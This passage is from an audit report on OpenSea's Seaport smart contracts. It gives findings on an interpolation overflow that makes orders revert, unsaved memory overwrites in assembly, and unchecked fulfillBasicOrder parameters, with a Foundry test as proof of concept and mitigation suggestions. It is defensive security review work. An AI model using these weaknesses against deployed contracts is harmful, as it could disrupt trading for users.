href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L57\">https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L57</a> will almost always revert in that case since <code>remaining</code> will be very large and this block of code is checked Solidity.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/Seaport.sol\">Seaport.sol</a></p>\n<p>Use the new test below and run <code>forge test -m testAdvancedPartialMaxEndTime -vvvv</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testAdvancedPartialMaxEndTime</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">FuzzInputs</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputs</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">FuzzInputs</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t[</span><span class=\"mtk11\">uint120</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\">), </span><span class=\"mtk7\">20</span><span class=\"mtk1\">, </span><span class=\"mtk7\">30</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">_testAdvancedPartialMaxEndTime</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">Context</span><span class=\"mtk1\">(</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">inputs</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_testAdvancedPartialMaxEndTime</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">Context</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">context</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">resetTokenBalancesBetweenRuns</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">conduitKey</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">useConduit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t? </span><span class=\"mtk12\">conduitKeyOne</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t: </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">20</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">test1155_1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">endAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">_configureOfferItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC1155</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">endAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">_configureEthConsiderationItem</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">OrderParameters</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zone</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">offerItems</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">OrderType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">PARTIAL_OPEN</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// startTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// endTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">zoneHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">conduitKey</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">OrderComponents</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderComponents</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getOrderComponents</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getNonce</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOrderHash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">orderComponents</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">signOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">alicePk</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">orderHash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offerItems</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">AdvancedOrder</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">advancedOrder</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">AdvancedOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk8\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fulfillAdvancedOrder</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\tvalue: </span><span class=\"mtk7\">10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}(</span><span class=\"mtk12\">advancedOrder</span><span class=\"mtk1\">, </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">CriteriaResolver</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(, , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalFilled</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSize</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">context</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t.</span><span class=\"mtk12\">consideration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t.</span><span class=\"mtk11\">getOrderStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">orderHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Need to find a way to compute the linear interpolation without overflows.\nFor <code>(a + b) / 2</code>, the trick is <code>a / 2 + b / 2 + (a &#x26; b &#x26; 1)</code>:\n<a href=\"https://devblogs.microsoft.com/oldnewthing/20220207-00/?p=106223\">https://devblogs.microsoft.com/oldnewthing/20220207-00/?p=106223</a></p>\n<p>Need to find a similar trick for <code>(x * a + y * b) / (x + y)</code>.</p>\n<p>Worst case it can also be a front end fix.</p>\n<h2 id=\"16-_preparebasicfulfillmentfromcalldata-overwrites-memory-extensively\" style=\"position:relative;\"><a href=\"#16-_preparebasicfulfillmentfromcalldata-overwrites-memory-extensively\" aria-label=\"16 _preparebasicfulfillmentfromcalldata overwrites memory extensively permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[16] <code>_prepareBasicFulfillmentFromCalldata</code> overwrites memory extensively</h2>\n<p>The <code>_prepareBasicFulfillmentFromCalldata</code> function prepares ABI encoded data at fixed location in memory (starting at <code>0x80</code> and writing as high as <code>0x1e0+0x20</code>).</p>\n<p>The overwritten memory does not seem to be saved, and this function has multiple assembly blocks (probably for avoiding <code>stack too deep errors</code>?). The only field restored is the zero slot.</p>\n<p>The only use in Seaport is the <code>Consideration.fulfillBasicOrder</code> → <code>_validateAndFulfillBasicOrder</code> → <code>_prepareBasicFulfillmentFromCalldata</code> call chain, where this does not seem to be a problem, because they are not allocating memory prior to entering this function (according to displaying the free memory pointer in the test suite).</p>\n<p>This would become a big issue if some functions would allocate memory. It is also very dependent on the compiler version.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Consideration.sol#L76\">Consideration.sol#L76</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L70\">BasicOrderFulfiller.sol#L70</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L325\">BasicOrderFulfiller.sol#L325</a></p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider restoring the dirty memory.</p>\n<h2 id=\"17-parameters-passed-to-fulfillbasicorder-insufficiently-checked\" style=\"position:relative;\"><a href=\"#17-parameters-passed-to-fulfillbasicorder-insufficiently-checked\" aria-label=\"17 parameters passed to fulfillbasicorder insufficiently checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[17] Parameters passed to <code>fulfillBasicOrder()</code> insufficiently checked</h2>\n<p>The parameters that are passed to function <code>fulfillBasicOrder()</code> aren’t sufficiently checked. Due to some lucky circumstances this doesn’t lead to issues. However it is safer to do additional checking.</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong><br>\n<a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L70-L295\">BasicOrderFulfiller.sol#L70-L295</a>, <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Consideration.sol#L76-L84\">Consideration.sol#L76-L84</a></p>\n<p>The parameters are passed from <code>fulfillBasicOrder()</code> to <code>_validateAndFulfillBasicOrder()</code>. As these <code>parameters</code> are <code>calldata</code>, no bounds checking is done.</p>\n<p>Assume the field for <code>BasicOrder_basicOrderType</code> contains the value of 6 * 4. Then the <code>route</code> will be 6, which is an out of bounds value. However while in assembly this is not detected.\nWhen calculating <code>receivedItemType</code>, it will get a value of 4, which is a valid value (<code>ERC721_WITH_CRITERIA</code>).\nHowever if this would be used, the rest of the logic isn’t prepared for this value.</p>\n<p>Luckily after the <code>assembly</code> code, <code>route</code> is evaluated in Solidity. At that moment Solidity catches the out of bound value and reverts. However if the code would be optimized with more assembly then this would not have been caught.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Consideration</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ConsiderationInterface</span><span class=\"mtk1\">, </span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fulfillBasicOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BasicOrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> 